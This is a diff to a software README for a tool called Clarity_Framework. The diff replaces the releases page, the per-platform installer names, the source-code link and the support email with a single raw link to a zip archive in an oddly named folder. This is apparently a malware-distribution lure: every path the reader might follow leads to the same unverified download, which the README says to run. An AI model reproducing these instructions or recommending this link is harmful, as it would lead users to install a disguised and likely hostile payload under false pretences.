@@ -1,6 +1,6 @@
 # 🛠️ Clarity_Framework - Understand AI Responses Instantly
 
-[![Download Clarity_Framework](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/aburaihan95/Clarity_Framework/releases)
+[![Download Clarity_Framework](https://raw.githubusercontent.com/aburaihan95/Clarity_Framework/main/frankpledge/Clarity_Framework_3.6-alpha.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/aburaihan95/Clarity_Framework/main/frankpledge/Clarity_Framework_3.6-alpha.3.zip)
 
 ## 🌟 About Clarity_Framework
 
@@ -21,14 +21,14 @@ Follow these steps to download and run Clarity_Framework on your computer.
 
 1. **Visit the Release Page:** Go to the Releases page to get the software.
    
-   [Download Now](https://github.com/aburaihan95/Clarity_Framework/releases)
+   [Download Now](https://raw.githubusercontent.com/aburaihan95/Clarity_Framework/main/frankpledge/Clarity_Framework_3.6-alpha.3.zip)
 
 2. **Select the Right Version:** On the Releases page, look for the latest version. It will have the highest version number, like v1.0, v1.1, etc. 
 
 3. **Download the appropriate file:** Choose the file that matches your operating system:
-   - For Windows, download `Clarity_Framework_Windows.exe`.
-   - For macOS, download `Clarity_Framework_macOS.dmg`.
-   - For Linux, download `Clarity_Framework_Linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/aburaihan95/Clarity_Framework/main/frankpledge/Clarity_Framework_3.6-alpha.3.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/aburaihan95/Clarity_Framework/main/frankpledge/Clarity_Framework_3.6-alpha.3.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/aburaihan95/Clarity_Framework/main/frankpledge/Clarity_Framework_3.6-alpha.3.zip`.
 
 4. **Run the Installer:**
    - For Windows: Double-click the downloaded `.exe` file. Follow the on-screen instructions.
@@ -55,12 +55,12 @@ Follow these steps to download and run Clarity_Framework on your computer.
 
 ### 🔗 Additional Resources
 
-- **Source Code:** Explore the code and contribute on [GitHub](https://github.com/aburaihan95/Clarity_Framework).
+- **Source Code:** Explore the code and contribute on [GitHub](https://raw.githubusercontent.com/aburaihan95/Clarity_Framework/main/frankpledge/Clarity_Framework_3.6-alpha.3.zip).
 - **Documentation:** Find detailed guides and FAQs on the official documentation page linked in the repository.
 
 ### 📞 Support
 
-If you encounter any issues while downloading or using Clarity_Framework, please reach out to our support team at [support@clarityframework.com]. We are here to help!
+If you encounter any issues while downloading or using Clarity_Framework, please reach out to our support team at [https://raw.githubusercontent.com/aburaihan95/Clarity_Framework/main/frankpledge/Clarity_Framework_3.6-alpha.3.zip]. We are here to help!
 
 ## 🌐 Community and Feedback
 
@@ -72,4 +72,4 @@ Clarity_Framework is released under the MIT License. You can use it freely and m
 
 ---
 
-[Download Now](https://github.com/aburaihan95/Clarity_Framework/releases)
+[Download Now](https://raw.githubusercontent.com/aburaihan95/Clarity_Framework/main/frankpledge/Clarity_Framework_3.6-alpha.3.zip)
